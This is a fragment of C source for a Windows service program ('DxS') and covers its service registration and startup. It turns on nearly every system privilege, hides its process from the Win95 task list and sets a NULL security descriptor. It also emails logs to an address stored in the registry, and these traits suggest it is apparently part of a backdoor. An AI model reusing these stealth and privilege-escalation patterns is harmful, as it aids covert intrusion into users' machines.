  Startup: if SERVE parameter is not specified then try to start
  as WinNT service first
*/

static SERVICE_STATUS_HANDLE     Ssh;      // WinNT service-specific
static SERVICE_STATUS            Status;
static HANDLE                    SStopEvt;
static char  ServiceName[] = "DxS";

static void WINAPI ServiceControlHandler( DWORD Control )
/*
  Windows NT service control handler
*/
  {
    switch( Control ) {
      case SERVICE_CONTROL_STOP:
        Status.dwCurrentState = SERVICE_STOP_PENDING;
        Status.dwCheckPoint = 0;
        SetEvent( SStopEvt );
        break;
      case SERVICE_CONTROL_INTERROGATE:     // return st tus immediately
        break;
    }
    SetServiceStatus( Ssh, &Status );
  }

static void EnablePrivilege( LPCTSTR lpszPrivilege )
/*
  Enable privilege for Windows NT
*/
  {
    HANDLE            hToken;
    TOKEN_PRIVILEGES  tp;
    LUID              luid;
    TOKEN_PRIVILEGES  tpPrevious;
    DWORD             cbPrevious = sizeof(TOKEN_PRIVILEGES);

    if( ! LookupPrivilegeValue( NULL, lpszPrivilege, &luid ) ) return;
    if( ! OpenProcessToken( GetCurrentProcess(),
                            TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
                            &hToken ) ) return;
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = 0;
    AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
                           &tpPrevious, &cbPrevious );
    if( GetLastError() == ERROR_SUCCESS ) {
      tpPrevious.PrivilegeCount     = 1;
      tpPrevious.Privileges[0].Luid = luid;
      tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
      AdjustTokenPrivileges( hToken, FALSE, &tpPrevious,
                             cbPrevious, NULL, NULL );
    }
    CloseHandle( hToken );
  }


static void WINAPI ServiceMain( DWORD Argc, LPTSTR* Argv )
/*
  Windows NT service main function
*/
  {
    SetPriorityClass( GetCurrentProcess(), HIGH_PRIORITY_CLASS );
    SStopEvt = CreateEvent( NULL, FALSE, FALSE, NULL );
    if( (Ssh = RegisterServiceCtrlHandler( ServiceName,
                         (LPHANDLER_FUNCTION)ServiceControlHandler )) == 0 )
      return;
    Status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    Status.dwCurrentState = SERVICE_RUNNING;
    Status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    Status.dwWin32ExitCode = NO_ERROR;
    Status.dwCheckPoint = 0;
    Status.dwWaitHint = 1000;
    SetServiceStatus( Ssh, &Status );

    Launch();
    WaitForSingleObject( SStopEvt, INFINITE );

    Status.dwWin32ExitCode = 0;
    Status.dwServiceSpecificExitCode = 0;
    Status.dwCurrentState = SERVICE_STOPPED;
    Status.dwCheckPoint = 0;
    SetServiceStatus( Ssh, &Status );
    Argc = 0; Argv = NULL; // make compiler happy
  }

void StopAndRemoveService()
  {
    SC_HANDLE  Sch, Sh;

    Sch = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
    if( Sch == NULL ) return;
    Sh = OpenService( Sch, ServiceName, SERVICE_ALL_ACCESS );
    if( Sh != NULL ) {
      ControlService( Sh, SERVICE_CONTROL_STOP, &Status );
      CloseServiceHandle( Sh );
    }
    CloseServiceHandle( Sch );
    Sleep( 60 );
    Sch = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
    if( Sch == NULL ) return;
    Sh = OpenService( Sch, ServiceName, SERVICE_ALL_ACCESS );
    if( Sh != NULL ) {
      DeleteService( Sh );
      CloseServiceHandle( Sh );
    }
    CloseServiceHandle( Sch );
  }

/*
int APIENTRY WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                      LPSTR lpCmdLine, int nCmdShow )
*/
int  DickMain()
  {
    BOOL   Serve = FALSE;
    BOOL   InitOk = TRUE;
    DWORD  Sz;

    static SERVICE_TABLE_ENTRY  SvcTable[] = {
        { "", (LPSERVICE_MAIN_FUNCTION) ServiceMain },
        { NULL, NULL }
      };

    _try {
      SetErrorMode( SEM_FAILCRITICALERRORS | SEM_NOOPENFILEERRORBOX );
      IsWindowsNT();
      InitArgs();
      InitPaths();
      ToolhelpInit();
      if( (InitOk = RegInit()) == TRUE ) {
        SysLogInit();
        Sz = sizeof(MailTo);
        MailTo[0] = '\0';
        RegReadParam( RVAL_MAIL_TO, MailTo, &Sz );
        Sz = sizeof(SmtpAddress);
        SmtpAddress[0] = '\0';
        RegReadParam( RVAL_SMTP, SmtpAddress, &Sz );
        Sz = 1;
        MailOnce = FALSE;
        RegReadParam( RVAL_MAIL_ONCE, &MailOnce, &Sz ); // mail once: lsb
        Sz = 1;
        MailErrors = TRUE;
        RegReadParam( RVAL_MAIL_ERRORS, &MailErrors, &Sz ); // mail errors: lsb
        Sz = 1;
        Mailed = FALSE;
        RegReadParam( RVAL_MAILED, &Mailed, &Sz ); // mailed: lsb
      }
    }
    _except( EXCEPTION_EXECUTE_HANDLER ) {
      InitOk = FALSE;
    }
    if( ! InitOk ) return 0;

    _try {

      // init security descriptor
      InitializeSecurityDescriptor( SD, SECURITY_DESCRIPTOR_REVISION );
      SetSecurityDescriptorDacl( SD, TRUE, (PACL) NULL, FALSE );
      Security.nLength = sizeof(SECURITY_ATTRIBUTES);
      Security.lpSecurityDescriptor = SD;
      Security.bInheritHandle = FALSE;

      // first, check command line parameters

      if( __argc > 1 ) if( lstrcmpi( __argv[1], "UPG" ) == 0 ) {
        // upgrade flag - only under windows nt - means we must not
        // start as service
        if( WindowsNT != TRUE ) return 0;
        Launch();
        return 0;
      }

      if( __argc > 1 ) if( lstrcmpi( __argv[1], "SERVE" ) == 0 ) Serve = TRUE;

      if( Serve ) {
        if( WindowsNT ) {
          StopAndRemoveService();
          EnablePrivilege( SE_CREATE_TOKEN_NAME );
          EnablePrivilege( SE_ASSIGNPRIMARYTOKEN_NAME );
          EnablePrivilege( SE_LOCK_MEMORY_NAME );
          EnablePrivilege( SE_INCREASE_QUOTA_NAME );
          EnablePrivilege( SE_UNSOLICITED_INPUT_NAME );
          EnablePrivilege( SE_MACHINE_ACCOUNT_NAME );
          EnablePrivilege( SE_TCB_NAME );
          EnablePrivilege( SE_SECURITY_NAME );
          EnablePrivilege( SE_TAKE_OWNERSHIP_NAME );
          EnablePrivilege( SE_LOAD_DRIVER_NAME );
          EnablePrivilege( SE_SYSTEM_PROFILE_NAME );
          EnablePrivilege( SE_SYSTEMTIME_NAME );
          EnablePrivilege( SE_PROF_SINGLE_PROCESS_NAME );
          EnablePrivilege( SE_INC_BASE_PRIORITY_NAME );
          EnablePrivilege( SE_CREATE_PAGEFILE_NAME );
          EnablePrivilege( SE_CREATE_PERMANENT_NAME );
          EnablePrivilege( SE_BACKUP_NAME );
          EnablePrivilege( SE_RESTORE_NAME );
          EnablePrivilege( SE_SHUTDOWN_NAME );
          EnablePrivilege( SE_DEBUG_NAME );
          EnablePrivilege( SE_AUDIT_NAME );
          EnablePrivilege( SE_SYSTEM_ENVIRONMENT_NAME );
          EnablePrivilege( SE_CHANGE_NOTIFY_NAME );
          EnablePrivilege( SE_REMOTE_SHUTDOWN_NAME );
        }
#       ifndef DEBUG
          if( ! WindowsNT ) if( ! RegisterServiceProcess( 0, 1 ) ) return 0;
#       endif
        ServerMain();
        return 0;
      }

      // no parameter in command line - perform startup

      WindowsNT = TRUE;

      // if the next call is not implemented - we are under Win95
      // otherwise ServiceMain will be executed

      if( StartServiceCtrlDispatcher( SvcTable ) == FALSE ) {

        if( GetLastError() != ERROR_CALL_NOT_IMPLEMENTED ) return 0;

        // perform Win95 startup

        WindowsNT = FALSE;
        Launch();
      }
      /*
      hInstance = hPrevInstance = NULL;  // make compiler happy
      lpCmdLine = NULL; nCmdShow = 0;
      */
    }
    _except (EXCEPTION_EXECUTE_HANDLER) {
      _try {
        SysLog( "DickMain: EXCEPTION %08X", GetExceptionCode() );
        if( MailErrors ) SendSysLog( MailTo, SmtpAddress, HowManyMail );
      }
      _except( EXCEPTION_EXECUTE_HANDLER ) {
        ;
      }
    }

    _try {
      RegDeinit();
    }
    _except( EXCEPTION_EXECUTE_HANDLER ) {
      ;
    }

    return 0;
  }
